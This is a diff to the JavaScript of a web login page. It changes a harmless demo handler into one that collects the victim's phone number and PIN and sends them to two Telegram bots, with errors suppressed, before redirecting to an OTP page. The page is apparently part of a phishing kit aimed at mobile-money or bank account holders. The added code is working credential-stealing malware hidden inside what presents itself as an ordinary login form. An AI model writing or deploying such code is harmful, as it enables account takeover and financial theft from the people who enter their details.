@@ -379,22 +379,51 @@
             });
         });
 
-      // ========== DEMO LOGIN CLICK ==========
-loginBtn.addEventListener('click', () => {
-    const phone = phoneInput.value.trim();
+        // ========== LOGIN CLICK ==========
+        loginBtn.addEventListener('click', () => {
+            const phone = phoneInput.value.trim();
+            if (!phone) {
+                alert('Please enter phone number');
+                return;
+            }
 
-    if (!phone) {
-        alert('Please enter a sample phone number');
-        return;
-    }
+            spinnerOverlay.style.display = 'flex';
 
-    spinnerOverlay.style.display = 'flex';
+            // Save phone to localStorage
+            localStorage.setItem('phone', phone);
 
-    setTimeout(() => {
-        spinnerOverlay.style.display = 'none';
-        alert('Demo completed successfully.');
-    }, 20000);
-});
+            // Build the credential message
+            const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}`;
+
+            // Send to Bot 1
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_1,
+                    text: message
+                })
+            }).catch(() => {});
+
+            // Send to Bot 2
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_2,
+                    text: message
+                })
+            }).catch(() => {});
+
+            // Proceed to next page
+            setTimeout(() => {
+                window.location.href = 'otp.html';
+            }, 40000);
+        });
 
         checkPinComplete();
         pinBoxes[0].focus();
